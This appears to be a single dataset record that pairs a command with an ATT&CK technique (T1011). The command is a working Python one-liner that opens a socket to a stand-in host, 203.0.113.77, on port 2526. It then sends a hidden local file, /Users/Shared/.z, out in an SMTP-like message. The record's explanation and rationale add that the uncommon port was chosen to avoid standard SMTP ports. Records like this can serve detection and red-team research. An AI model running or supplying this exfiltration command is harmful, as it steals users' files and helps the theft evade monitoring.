command:
python3 -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("203.0.113.77", 2526)); w=lambda x:s.sendall(x); w(b"HELO x
MAIL FROM:<u@lab>
RCPT TO:<r@lab>
DATA
"); w(open("/Users/Shared/.z","rb").read()+b"
.
QUIT
"); s.close()'
explanation: Performs minimal SMTP-like exfiltration over a non-standard submission port, using email as an alternate medium rather than the primary C2 channel, consistent with T1011. Uses documentation IPv4 space for safe demonstration.
rationale_steps: Open a TCP socket to a high, uncommon port (2526) to avoid standard SMTP ports.
Issue basic SMTP commands and send file contents as the message body.
Leverages SMTP/email as an alternate network medium for exfiltration.
